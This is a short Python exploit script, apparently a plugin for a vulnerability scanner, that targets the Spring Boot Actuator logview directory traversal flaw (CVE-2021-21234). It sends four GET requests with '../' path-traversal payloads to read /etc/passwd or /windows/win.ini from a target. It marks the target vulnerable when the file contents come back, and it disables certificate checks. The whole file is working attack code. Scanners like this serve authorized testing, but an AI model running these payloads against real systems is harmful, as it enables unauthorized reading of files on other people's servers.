#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Spring Boot Actuator Logview Directory Traversal CVE-2021-21234',

      'level'     :   'medium',

      'FOFA'      :   '',

      'ifbug'     :   False,

      'author'    :   'ppxfx',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../','/log/view?filename=/etc/passwd&base=../../../../../../../../../../','/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../','/log/view?filename=/windows/win.ini&base=../../../../../../../../../../']
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + targets[2]
  url4 = url + targets[3]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "root:" in res.text:
      # ret['huixian'] = res.text
      ret['url'] = url1
      ret['ifbug'] = True
      res.close()
      return ret
    res2=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res2.status_code == 200 and "root:" in res2.text:
      # ret['huixian'] = res.text
      ret['url'] = url2
      ret['ifbug'] = True
      res2.close()
      return ret
    res3=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res3.status_code == 200 and "for 16-bit app support" in res3.text:
      # ret['huixian'] = res.text
      ret['url'] = url3
      ret['ifbug'] = True
      res3.close()
      return ret
    res4=requests.get(url=url4,headers=headers,timeout=5,verify=False)
    if res4.status_code == 200 and "for 16-bit app support" in res4.text:
      # ret['huixian'] = res.text
      ret['url'] = url4
      ret['ifbug'] = True
      res4.close()
      return ret
    else:
      return ret
  except:
    return ret